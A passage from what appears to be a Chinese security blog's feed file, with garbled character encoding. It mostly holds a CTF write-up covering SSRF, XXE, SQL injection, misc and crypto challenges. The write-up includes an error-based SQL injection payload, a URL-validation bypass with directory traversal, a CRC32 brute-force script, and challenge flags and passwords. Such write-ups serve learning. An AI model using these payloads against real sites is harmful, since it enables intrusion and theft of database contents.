src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/20180410203051218.png" alt></p><ul><li>pythonä»£ç å®ç°</li></ul><h4 id="0x-02-è´ç¥–ï¼ˆBezoutï¼‰ç­‰å¼"><a href="#0x-02-è´ç¥–ï¼ˆBezoutï¼‰ç­‰å¼" class="headerlink" title="0x 02 è´ç¥–ï¼ˆBezoutï¼‰ç­‰å¼"></a>0x 02 è´ç¥–ï¼ˆBezoutï¼‰ç­‰å¼</h4><ul><li>åŸºæœ¬å®šç†</li></ul><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200401114721981.png" alt></p><ul><li>æ±‚è§£ç­‰å¼</li></ul><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200401121714567.png" alt></p><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200401121756609.png" alt></p><h4 id="0x-03-æœ€å¤§å…¬å› æ•°è¿›ä¸€æ­¥æ€§è´¨"><a href="#0x-03-æœ€å¤§å…¬å› æ•°è¿›ä¸€æ­¥æ€§è´¨" class="headerlink" title="0x 03 æœ€å¤§å…¬å› æ•°è¿›ä¸€æ­¥æ€§è´¨"></a>0x 03 æœ€å¤§å…¬å› æ•°è¿›ä¸€æ­¥æ€§è´¨</h4><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200401221905664.png" alt></p><h4 id="0x-04-æ•´æ•°çš„è¿›ä¸€æ­¥æ€§è´¨"><a href="#0x-04-æ•´æ•°çš„è¿›ä¸€æ­¥æ€§è´¨" class="headerlink" title="0x 04 æ•´æ•°çš„è¿›ä¸€æ­¥æ€§è´¨"></a>0x 04 æ•´æ•°çš„è¿›ä¸€æ­¥æ€§è´¨</h4><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200401222233184.png" alt></p><h4 id="0x-05-ç®—æœ¯åŸºæœ¬å®šç†ä¸ç´ æ•°å®šç†"><a href="#0x-05-ç®—æœ¯åŸºæœ¬å®šç†ä¸ç´ æ•°å®šç†" class="headerlink" title="0x 05 ç®—æœ¯åŸºæœ¬å®šç†ä¸ç´ æ•°å®šç†"></a>0x 05 ç®—æœ¯åŸºæœ¬å®šç†ä¸ç´ æ•°å®šç†</h4><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200401193511202.png" alt></p><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200401222410868.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> knowledge </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ä¿¡å®‰æ•°åŸº </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>YCTF-å…±å…‹æ—¶è‰°.åœè¯¾ä¸åœèµ›é¢˜è§£</title>
      <link href="/2020/03/27/YCTF-%E5%85%B1%E5%85%8B%E6%97%B6%E8%89%B0-%E5%81%9C%E8%AF%BE%E4%B8%8D%E5%81%9C%E8%B5%9B%E9%A2%98%E8%A7%A3/"/>
      <url>/2020/03/27/YCTF-%E5%85%B1%E5%85%8B%E6%97%B6%E8%89%B0-%E5%81%9C%E8%AF%BE%E4%B8%8D%E5%81%9C%E8%B5%9B%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="0x-01-rce-nopar"><a href="#0x-01-rce-nopar" class="headerlink" title="0x 01 rce nopar"></a>0x 01 rce nopar</h4><ul><li><p>è€ƒç‚¹</p><p>æ— å‚æ•°rce</p></li><li><p>è§£é¢˜æ­¥éª¤</p></li></ul><p>æ ¹æ®ä»£ç å®¡è®¡å¾—çŸ¥æ˜¯æ— å‚æ•°rceï¼Œç”¨sessionè¯»æ–‡ä»¶</p><p>â€‹        <img src="https://uploader.shimo.im/f/5MzRLiUyqO0eMMsW.png!thumbnail" alt="img">      </p><h4 id="0x-02-SSRF"><a href="#0x-02-SSRF" class="headerlink" title="0x 02 SSRF"></a>0x 02 SSRF</h4><ul><li><p>è€ƒç‚¹</p><p>SSRF</p></li><li><p>è§£é¢˜è¿‡ç¨‹</p></li></ul><ol><li>é¦–å…ˆç”¨base64äºŒæ¬¡ç¼–ç è¯»æºç       <img src="https://uploader.shimo.im/f/zDj6k19gpNgYKm92.png!thumbnail" alt="img">      </li></ol><p>index.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(E_ALL || ~E_NOTICE);</span><br><span class="line"></span><br><span class="line">header(&#39;content-type:text&#x2F;html;charset&#x3D;utf-8&#39;);</span><br><span class="line">if(! isset($_GET[&#39;file&#39;]))</span><br><span class="line">    header(&#39;Refresh:0;url&#x3D;.&#x2F;index.php?file&#x3D;WTNSbWFXMWhaMlV1YW5Cbg&#x3D;&#x3D;&#39;);</span><br><span class="line">$file &#x3D; base64_decode(base64_decode($_GET[&#39;file&#39;]));</span><br><span class="line">echo &#39;&lt;title&gt;&#39;.$_GET[&#39;file&#39;].&#39;&lt;&#x2F;title&gt;&#39;;</span><br><span class="line">$file &#x3D; preg_replace(&quot;&#x2F;[^a-zA-Z0-9.]+&#x2F;&quot;,&quot;&quot;, $file);</span><br><span class="line">echo &#39;input_filename:   &#39;. $file.&#39;&lt;&#x2F;br&gt;&#39;;</span><br><span class="line">$file &#x3D; str_replace(&quot;ctf&quot;,&quot;flag&quot;, $file);</span><br><span class="line">echo &#39;real_filename:   &#39;.$file.&#39;&lt;&#x2F;br&gt;&#39;;</span><br><span class="line">$txt &#x3D; base64_encode(file_get_contents($file));</span><br><span class="line"> </span><br><span class="line">echo &quot;&lt;img src&#x3D;&#39;data:image&#x2F;gif;base64,&quot;.$txt.&quot;&#39;&gt;&lt;&#x2F;img&gt;&quot;;</span><br><span class="line">&#x2F;*</span><br><span class="line"> * Can you find the flag file?</span><br><span class="line"> *</span><br><span class="line"> * Hint: hal0flagi5here.php</span><br><span class="line"> *&#x2F;</span><br></pre></td></tr></table></figure><p>è¯»å–hal0flagi5here.phpä»£ç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$argv[1]&#x3D;$_GET[&#39;url&#39;];</span><br><span class="line">if(filter_var($argv[1],FILTER_VALIDATE_URL))</span><br><span class="line">&#123;</span><br><span class="line">$r &#x3D; parse_url($argv[1]);</span><br><span class="line">print_r($r);</span><br><span class="line">if(preg_match(&#39;&#x2F;happyctf\.com$&#x2F;&#39;,$r[&#39;host&#39;]))</span><br><span class="line">&#123;</span><br><span class="line">$url&#x3D;file_get_contents($argv[1]);</span><br><span class="line">echo($url);</span><br><span class="line">&#125;else</span><br><span class="line">&#123;</span><br><span class="line">echo(&quot;error&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;else</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;403 Forbidden&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨0://ç»•è¿‡filter_var($argv[1],FILTER_VALIDATE_URL)ç„¶åç›®å½•ç©¿è¶Šå³å¯        <img src="https://uploader.shimo.im/f/G7Qe2Bk3DI4WI1ui.png!thumbnail" alt="img">               <img src="https://uploader.shimo.im/f/6CT03lROCWoVlN3F.png!thumbnail" alt="img">      </p><h4 id="0x-03-WEB3-SQLI"><a href="#0x-03-WEB3-SQLI" class="headerlink" title="0x 03 WEB3-SQLI"></a>0x 03 WEB3-SQLI</h4><ul><li><p>è€ƒç‚¹</p><p>äºŒæ¬¡æ³¨å…¥+æŠ¥é”™æ³¨å…¥</p></li><li><p>è§£é¢˜è¿‡ç¨‹</p></li></ul><p>æ³¨å†Œè¿™è¾¹é‚®ç®±å­˜åœ¨waf,ä¸èƒ½å­˜åœ¨@ç¬¦å·ï¼Œç›´æ¥ç½®ç©ºå°±è¡Œ</p><p>paylodï¼š<code>test&quot;||(updatexml(1,concat(0x3a,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database()))),1))#</code></p><p>å¾—åˆ°æ•°æ®è¡¨</p><p><img src="https://uploader.shimo.im/f/JIfGTqEETasaqGhS.png!thumbnail" alt="img"></p><p>æŸ¥è¯¢flagè¡¨çš„flagå­—æ®µï¼ˆTABLENAME:flag   columnname:flagï¼‰      <img src="https://uploader.shimo.im/f/DA0O3EtilM4Z101y.png!thumbnail" alt="img">      </p><h3 id="0x-04-XXE"><a href="#0x-04-XXE" class="headerlink" title="0x 04 XXE"></a>0x 04 XXE</h3><ul><li><p>è€ƒç‚¹</p><p>xxe</p></li><li><p>è§£é¢˜è¿‡ç¨‹</p></li></ul><p>1.ä¸‹è½½æ³„éœ²çš„æ–‡ä»¶å¾—åˆ°æºä»£ç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_POST[&quot;submit&quot;])) &#123;</span><br><span class="line">    $target_file &#x3D; getcwd().&quot;&#x2F;upload&#x2F;&quot;.md5($_FILES[&quot;file&quot;][&quot;tmp_name&quot;]);</span><br><span class="line">    if (move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], $target_file)) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            $result &#x3D; @file_get_contents(&quot;zip:&#x2F;&#x2F;&quot;.$target_file.&quot;#docProps&#x2F;core.xml&quot;);</span><br><span class="line">            $xml &#x3D; new SimpleXMLElement($result, LIBXML_NOENT);</span><br><span class="line">            $xml-&gt;registerXPathNamespace(&quot;dc&quot;, &quot;http:&#x2F;&#x2F;purl.org&#x2F;dc&#x2F;elements&#x2F;1.1&#x2F;&quot;);</span><br><span class="line">            foreach($xml-&gt;xpath(&#39;&#x2F;&#x2F;dc:title&#39;) as $title)&#123;</span><br><span class="line">                echo &quot;Title &#39;&quot;.$title . &quot;&#39; has been added.&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (Exception $e)&#123;</span><br><span class="line">            echo $e;</span><br><span class="line">            echo &quot;ä¸Šä¼ æ–‡ä»¶ä¸æ˜¯ä¸€ä¸ªdocxæ–‡æ¡£.&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;ä¸Šä¼ å¤±è´¥.&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è§£æ³•å‚è€ƒï¼š<a href="https://www.jianshu.com/p/40d6d0e7117f" target="_blank" rel="noopener">https://www.jianshu.com/p/40d6d0e7117f</a></p><p>å°†sample,docxè§£å‹ï¼Œä¿®æ”¹docProps/core.xmlç„¶åå†å‹ç¼©æ”¹åç¼€ä¸Šä¼ å¾—åˆ°flag</p><h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><h4 id="0x-01-XOR"><a href="#0x-01-XOR" class="headerlink" title="0x 01 XOR"></a>0x 01 XOR</h4><p>èµ›åç¾¤é‡Œçš„å¸ˆå‚…ç»™äº†åšå®¢å‚è€ƒï¼š</p><p><a href="https://shawroot.hatenablog.com/entry/2019/11/04/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Ccrypto%3Acr2-many-time-secrets" target="_blank" rel="noopener">https://shawroot.hatenablog.com/entry/2019/11/04/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Ccrypto%3Acr2-many-time-secrets</a></p><h4 id="0x-02-Misc2"><a href="#0x-02-Misc2" class="headerlink" title="0x 02 Misc2"></a>0x 02 <strong>Misc2</strong></h4><p>é¢˜ç›®ç»™äº†ä¸€ä¸ªdisk3ï¼Œç”¨fileæŸ¥ä¸€ä¸‹ï¼Œæ˜¯Linux etx3ï¼Œæˆ‘ä»¬åˆ›ä¸ªæ–‡ä»¶å¤¹æŒ‚è½½        <img src="https://uploader.shimo.im/f/6uoNXvttnOI2XrtW.png!thumbnail" alt="img">      é‡Œé¢æœ‰ä¸€ä¸ªreadmeå’Œä¸€ä¸ªå‹ç¼©åŒ…ï¼Œé‡Œé¢æœ‰åŠ å¯†çš„flag.pngreadmeè¯´å¯†ç è¢«åˆ é™¤äº†        <img src="https://uploader.shimo.im/f/aOrCmKlkEgA9xLV8.png!thumbnail" alt="img">      </p><p>ç”¨DiskGeniuså·¥å…·æ¢å¤ä¸€ä¸‹æ–‡ä»¶å¾—åˆ°å‹ç¼©åŒ…å¯†ç don0tgu355p@sswdï¼Œæœ€åè¿™ä¸ªpngæ–‡ä»¶æ”¹ä¸€ä¸‹é«˜åº¦ï¼Œå¾—åˆ°flag</p><p><img src="/2020/03/27/YCTF-%E5%85%B1%E5%85%8B%E6%97%B6%E8%89%B0-%E5%81%9C%E8%AF%BE%E4%B8%8D%E5%81%9C%E8%B5%9B%E9%A2%98%E8%A7%A3/E:%5CHexo-Blog%5Csource_posts%5CYCTF-%E5%85%B1%E5%85%8B%E6%97%B6%E8%89%B0-%E5%81%9C%E8%AF%BE%E4%B8%8D%E5%81%9C%E8%B5%9B%E9%A2%98%E8%A7%A3%5Cimage-20200327215149221.png" alt="image-20200327215149221"></p><h4 id="0x-03-Keyboard"><a href="#0x-03-Keyboard" class="headerlink" title="0x 03 Keyboard"></a>0x 03 Keyboard</h4><p>å‚è€ƒï¼š<a href="https://www.cnblogs.com/cnnnnnn/p/11939107.htmlåŸé¢˜" target="_blank" rel="noopener">https://www.cnblogs.com/cnnnnnn/p/11939107.htmlåŸé¢˜</a></p><h3 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h3><h4 id="0x-01-ç­¾åˆ°"><a href="#0x-01-ç­¾åˆ°" class="headerlink" title="0x 01 ç­¾åˆ°"></a>0x 01 ç­¾åˆ°</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">openssl rsautl -decrypt -in flag.en -inkey rsa_private_key.pem -out flag.txt</span><br><span class="line">flag&#123;We1c0meCtf3r_elab&#125;</span><br></pre></td></tr></table></figure><h4 id="0x-02-CRC32"><a href="#0x-02-CRC32" class="headerlink" title="0x 02 CRC32"></a>0x 02 CRC32</h4><p>CRC32çˆ†ç ´</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import binascii</span><br><span class="line">crcs &#x3D; set([0x308E1D5B,0x5194C2D0,0x5C48F6CA])</span><br><span class="line"></span><br><span class="line">def crackfour():</span><br><span class="line">    r &#x3D; xrange(32, 127)</span><br><span class="line">    for a in r:</span><br><span class="line">        for b in r:</span><br><span class="line">         for c in r:</span><br><span class="line">            for d in r:</span><br><span class="line">               txt &#x3D; chr(a)+chr(b)+chr(c)+chr(d)</span><br><span class="line">               crc &#x3D; binascii.crc32(txt)</span><br><span class="line">               if (crc &amp; 0xFFFFFFFF) in crcs:</span><br><span class="line">                  print txt</span><br><span class="line">crackfour()</span><br></pre></td></tr></table></figure><p>å¾—åˆ°å‹ç¼©åŒ…å¯†ç æ˜¯64p2@sworD20ï¼Œè§£å‹å¾—åˆ°flag</p><h4 id="0x-03-RSABackDoor"><a href="#0x-03-RSABackDoor" class="headerlink" title="0x 03 RSABackDoor"></a>0x 03 RSABackDoor</h4><p>åŸé¢˜ï¼Œå‚è€ƒ<a href="https://xz.aliyun.com/t/6703" target="_blank" rel="noopener">https://xz.aliyun.com/t/6703</a></p><p>å¾—åˆ°flag{4e8954396d69c8daaf849655cee3dc9bd6486a0e}</p>]]></content>
      
      
      <categories>
          
          <category> ctfwp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> YCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpååºåˆ—åŒ–ç¬”è®°</title>
      <link href="/2020/03/26/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AC%94%E8%AE%B0/"/>
      <url>/2020/03/26/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">è¾“å…¥å¯†ç ï¼ŒæŸ¥çœ‹æ–‡ç« </label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="c9134ea72c60128701d2ce8f96f3776445ab3f63afa2070ce24f1aa8728c0830">69d9c72eaa9dc2ef5a7cca7638440efb410a752a87c7f0be4f48f7f81e4830d3772313dc771b019b249def7848b1cbda0879a12477a14fa29bb7a29dac44202d6a7b78d405229c2c68750236b5ad8d5ae76eeaf29995708acd785ec0229f04b053f937370c50a4a6d7a7a9b5b6fe108c31a584f7a20b075c9def1dbbadd858297e34fb886ede4e35bccfd43d7bfb34d0ba4932df1ca39a18a2eb710e879c10d266329d155f2cc63f81943230bc80fe0b041bf546e30d5fced70dfc469abe248298f42870000319a61d8fe1e8c5705cc46a1ff4e8bc535a887d8dc490b708c8fafbf1f3a2b0d3d7eec0e9e6d3d00bb1727ef2c4fe1550dd531c3bdeedae49582fd2251e6fd62d994ed617ca76a03f0cd372a1df3184e36dd525088115e22fc7f55c142b53c7940931f890f803f35604beda27e0e913b74586337d59cd4693389b900d98dee20e8cf4a93ad1536922ee5406016a3d71f94287d2dd59fac937903d1d1884f463d14b387a0615dbf085731d9554e3808cb9e553eb2ceaec0980e0b582be00c1d60334a4a6d79f8d90824e62afa2b6e89d82b64d3b3e82cad9062f7b168acce0d0ff3947905643bd8aaf21848d42822a9082f3853c7f8d5c4aa5e78223f0258791df970be6e9984acbe7d6b2fff2067686525a874ad97acb21724760b3fa79a3fbf2d5451278448dd2d1805f95aa81099c192b59772404147574167261fb42043c58a39e6e91b4718aad516d735aba1b3b2b8c9e15960a1de30f80876e7562f5aaa0ac1261cd201c31198988e7ca9faa10789c870f8089a551392354c926ddb52e6339797cff285a212c87629eb505c8ca0b73b1d23b9f3cfc5f45d4e8587e3a1f849c61ed7ab62c0cf44c6c6011cd4b06fd019cab3d04984c4908a2e13a66d1e9288fb3d7b08b2661cd5b07a3e21a2a8a75f8ba63cebb842d7b88c1d59fe5b601d888a542a8187508f5834e54dcf0488e000b92ca8babeac0635721039b1c2f48c086bf3b7c74e4d4a0517adaf0782dc89d4a510e42bc7558dded455d26c29c21436997ffc168b3346413f513d24ed2be30aad5a855c65b0d4a6bc8ca3343530c0017b6c71d8aa44552fed20f6424149d69912cd86f6fde4658afe03d9307d8251702a0021a0a5e6b1a4a24ee6c638038bad5c5aa61f2a88aefaab60f3b0fbc71edb0340e0589b87efefde282cd4ef75ff655403fec5dbe7388394dd32f88c24ddef89bdb95e84c5b1fa964b5cf5c4f3e7fdebea448137192bfbf154878c5831b66f3db60c867dd5e7bc7d81ede48700804b0957a45f3f11bb0ace970290767b49d4e73bc18dad472a15ad0ab53adfd88054a3330e983643c37a8bd48eac58ad0c76f6c1f02088d0030d69df2d079ef9bc5855bb76d63f8e2a414b87391a353e90c05f25f2e6b9d629d1eda897d389242fe0d6f2e1ac88b14fc74a4b1225c276d61d451143678fac8bbb0417e9bd70fe69ff688d5c0d7d347a6a0ebdf2d09a7746280987be52a6f44723eacb12a82fe32d1d5bc1dd61ab5d61e8990bc882fc02efdbda0d9a9525e8f317f5f66126178c959768cb0433a5dd9ba327ad318ba9e2a293854f18d31c71dc8046cec79b796e597584d6b84bff7a458d0c1236a2c151fadd2878dbc03bb521bc0610dd1a25653539d0f01cb040a0a64fdf205a754a551802e952823b59d1cb7299a576730039bc028a4f2a52d8434554986b1b60500167e8ad30f62c0f0188a5ba0c6e0004e642d582b7c7259e001ab3a6a2ea07f367a9497baa435669d9a471a4f29c1afc5576535bdf05e0cca9206e8f02be40674cc66bf6156375b58eaccfa64298df22fed605a8612f5ebc56f2531494af711e0b2c6ec65408314a5bd73e45dcff23bc7217104148400f568e5c110d12afd3d4ec2581710cd5bd18e7a4c64753a99a930e29e5c64fcff7928de65f61f49912c1ec1821e3d434feac2750cd0986865d8e55e18fe2dd56ee9ff4440551685f8123440b1aa3d51361be5df0579671d959cd486e4de9bbe380926e85c3f9eff57a6b66432c4ebd120b6a005998af97250f74ed654a1ce691a4885ff2bed60f17cea25cef71d7b129c4c75940066b0c5b03d0de8339ba4e7abeacf555dddc2d3d836136ef5cef9e83f8957b0ea76033d11c56d330f64615ef87606677397664362b36044696f1f6a2ea50b97ceee08d47b2c01e2930e5826f1186043bc756e0a342b0bde280d3b52e8f296dcb7081d0689d97bd2ba0310e4374252dd872bd01b91f647acaa21a632f679590e116860e618aa32a527e043a4ac24f670fde79e1a8bac4f857886f71b68df6b40c5835422413f886a7d31b508cfdbef022a02e16c40d0e47fed0d876c31fb479bb173888ab4eefed72e44c3accf15af90427e91c0f01d77f006a6e97f8768050e1d56a56d61fde23edbc47930405678c0f3a6c7897b349c99d2abf91d3efa556c5796795a362449528554b21364bd8c6b23c9bdb29751857015ffde4693be4597aa6fb1fa660d0d78ab2a330275aad380a15756b9700b18e8f3fad68bc3a84b7dd0ef8a742aab67971df225a14c1ba13b9bf1882d62ed242296c1b92e67fba930924e62a428dff843ac7aaac466d9e88d714b0439cd16002a5f1c2f3575e0b5dbadf7593c8faa250e82e385cf9c95f2d946d06b6be98e6b090080fce268d479ab087ab6b300bb2f8023b8bb9a17f2eae98d82478dd745f61dada042901de2b82008c55b5dab464cf3a8556e7f4586c58a5cb20a0989313588e9e8d901c778e7e3cab9ef6da3ec0f3af2d869eb884ed18193e071543650a4b3c539b41bb91b648fe9cd7eaeeb3515120908b56baa61a888eb91be8ad77ec90b7c0c43b95fe9fb85412dd04e16f3806e00c2add9040926d4c15e62b7135298b3bed96db37e40e073f80b96fe2c02b72d6d6efc169b3cdced4743f2fe2c5e8e1c9a8ecb584f11982412958a852038581a8ed045b311c9a2a391b0762b1f73dccb0414b5a080bb4c3548cfe6008103e43a3c661c29b01d6efb1a70a344c75522595d4e19e3af213d4b456eafbb37244a0ae10d93b6f19f6b5c66c175f15cbe750d0e35c8592dca8773b954992db316ad48727eab16f61a276666f735d8945f774d23e5e37d4414bbbdbf4f89a56cfcc4b666a1a501410d44aeb2cee82e675e2b9f1b05993264e7c041ea3e409f50ad9edf2e749f857df24274741407bce9729498228b5b7b022744da6575c49103553f6a347ad6190f6af0524907c702b924d14596d7e0aabfe0020b4df7f1e93ec465dbb019582ede72bc36d3f16de2b321541d32b6d2e6ba9d1f926cc5305ecfed76f0c9661ce934f0d02ec74379c36ab9fa4c3bb704c0c3a4f622d64661366baa7ae707df50404b1140213455d4f774bb6bb55fa6d39eadc30c61b2a7c6e98c6a81fca83fae33a6bcc1b0e971a1577e80df35b89407de685bc27faeccfe54dbbef07f36b7b6d2e1f97981d5baaa7a4daaef2f00d4995c4e0293bed5df7949c12b636284e57b49b2ac019cba371703782bff7097ef67458353ba30e9916fadcc121a614ca11555d2f1e800ee0f134bebe3b24f9ddc60b0dd132faf2e8c4e16b7d02ec50f7d1baae0cf429b9f42ede0b438ccd3b142601a2848908c22462959aee8c87bcc8968e5d8c856c2e2c728ee6fc01dcc0b82898443cfffc0ea315799c612626e6bc23f0ca3c448b0015eaaecd20bba5542b13cf70ec9c6f07ee2b6ad48431e69d8e5aa719e1dec3a471f3f545c16764bf114d6ae0a202c1cb81cdc6e6578aef0017c1ded5c627f76932acdb7d2c72b4fd8d9e35efe4f337c3450d1082459a5e20992853951fbd2d0c4fcb6e60573280d6622959676c3057f23e6e93b9bd990653c2ac2144f568bf69bef4f997553b09dbdd9a8cd2cace52d9b613e22616e2c695d1fb878de6776a8d6e09322761cd5bb51b582226dd07dd59cf33fa4962d8459ba02cb270835205a3ca9f16e6ef886e2d0ec865635e987a643561a8bcad07acf416035de934211ddbcdadfe28996bb18386930baeddb585ef659a809bdfda08166b934962ad9d29e4355bd855b12c2c8f72e43a7702899be5010da81da61338b8a77326965468488691ef5e45a68cf433878ecea5fd327c4d2fb53d70a26ad7b8cc3a51da875c0a3168c211b82c9da56384b0ff4399ca410644950e8e2267f570318ae46200e4e934b50a6744dd3d46e852785749d2960120d6e2dc8ed2593312e1de972fa9ba0cbf7b485e0d7a617b16fa20a510ca53eabf2d5472f38036e825f2be7f3b4abed3fe1b5281162fe69e02acf908fe2e0bcd0aa871f6acfecd202541d9f998548eca135632d3b2c9faf92926b017a431770c393da5f322c216965d060d743aa4c6321443f64d66c2556ca2c54fa0cdb665d21cf11bc59293482e3c638caa59d6e132f0ab86087566be1a8bcf8f2592841f954d7408b2bc2aadbcebc9efe49fa19d01a80be197988cad8356a7740639ba4c467e87edaa26083455e3a1072f885f817976ebcf8b688ddbba63022b5d257653b20a2b4b1c4bcf67f221d066d2f7c1c8300d9cb3536b4c57630d68097ce42ef000e923a3e8ac2e27685d77fdbbf49015879b1b6205926d6635fa94958ef7c46660de9383d76599a37805b936da1958e7e744e4013e37966b36b9fa2f0fb8c6f9c29566995be7bfa9d213f9f27d009e1fa0cd2d7a5031cfea852086789a334e2bec188005ca3393d5da3139283d9559f021a9309660180c20ccd8ccf66ff6d7edcf8178cc9d7b98169645e689689608f4d948d8ad25b962dfe304c9ed4e7f6dc794be7393d4a93f2897cf3ce7167a40ae645cd913307c63b795cbaa1aa9dc71bd09840441428ef95839e8c84963db6406a1ec7d3351412500f8a79063b39ed36622fff29574cd29ec104a6ae4816b01d1198face08324ea083f36d506ae5a1eb86004d7b38444105e0e0657acbccea8214292683887a03a689b0275b7ace8bfd890a06e763659d31d3f06f453a81b962ad33e58a2802c1efd49d5a2e3e89335dc41b7a972fc57338eb3f12314f1ebd171f1729592a9ee846864d311dd58b7bbafc570cfbb6cf2530e627ab0efaac3b36beeebca316c893a7f3fa29baac16f87dbbd282dfc39f9e6f511df1bbd7a24262c6b7f97e361cec880592177f8890622907b74504771568f4013ea7f774c2f9d7c88f1d663e5d3d686bf662542a827ec1d2e3b48d0776d1ef1c4c506b509d68becc50d415009b3ff917a6509e656983cad143256b99b39dbfdbfdc9e33ea6d54851cb5434a88d231c5a34fc3345cf0899ad182725e4a321ee17c0de7f30fcc8fef23bf308c6976b08d23440845a143adb0b315573d6</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>BUUOJ-webåˆ·é¢˜ï¼ˆä¸‰ï¼‰</title>
      <link href="/2020/03/25/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%89%EF%BC%89/"/>
